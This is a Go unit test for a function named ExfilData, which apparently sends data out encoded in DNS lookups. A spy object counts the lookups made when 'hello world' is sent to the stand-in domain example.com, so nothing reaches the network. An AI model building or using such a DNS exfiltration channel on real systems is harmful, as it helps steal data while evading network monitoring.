package messagesending

import (
	"testing"
)

type dnsLookupSpy struct {
	lookupCount int
	domains     []string
}

func (d *dnsLookupSpy) Lookup(domain string) ([]string, error) {
	d.lookupCount++
	d.domains = append(d.domains, domain)
	return []string{}, nil
}

func TestDnsLookupSpyImplementsInterface(t *testing.T) {
	var _ DnsLookup = (*dnsLookupSpy)(nil)
}

func TestExfilData(t *testing.T) {
	payload := "hello world"
	dnsLookup := dnsLookupSpy{0, []string{}}
	ExfilData(payload, "example.com", &dnsLookup)

	if dnsLookup.lookupCount != 1 {
		t.Errorf("Expected %d DNS looksup, got %d", 1, dnsLookup.lookupCount)
	}
}
